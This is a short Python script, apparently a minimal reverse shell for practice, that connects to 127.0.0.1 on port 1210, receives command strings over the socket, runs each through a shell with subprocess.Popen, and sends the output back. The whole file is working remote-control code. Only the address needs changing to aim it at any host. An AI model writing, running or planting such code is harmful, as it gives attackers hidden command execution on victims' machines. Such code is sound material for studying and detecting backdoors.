import socket, subprocess as sp

IP = "127.0.0.1";
PORT = 1210;

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect((IP, PORT));

buff = 1024;
char = s.recv(buff);
msg = char;

while True:
	result = s.recv(buff);
	result = result.decode("utf-8");
	output = sp.Popen(result, stdin=sp.PIPE, stdout=sp.PIPE, shell=True);
	out, err = output.communicate();
	s.sendall(out+err);
s.close();